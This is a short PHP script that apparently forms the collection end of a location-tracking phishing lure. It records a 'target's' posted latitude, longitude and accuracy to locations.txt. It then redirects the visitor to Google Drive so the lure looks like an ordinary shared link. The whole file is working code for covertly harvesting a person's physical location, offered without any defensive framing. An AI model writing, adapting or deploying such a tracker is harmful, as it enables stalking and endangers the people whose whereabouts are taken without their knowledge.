<?php 
  //target latitude
  $lat = $_POST['lat'];
  //target Longitude
  $long = $_POST['long'];
  //location accuracy
  $acc = $_POST['acc'];
  
  //write downs all information in location.txt file
  $file = fopen('locations.txt', 'a');
  fwrite($file, "Latitude: ".$lat);
  fwrite($file, "\nLongitude: ".$long);
  fwrite($file, "\nAccuracy: ".$acc."\n\n");
  fclose($file);
?>

<html>
  <head>
    <!--redirects to Google Drive-->
    <meta http-equiv="refresh" content="1;url=https://drive.google.com">
  </head>
</head>
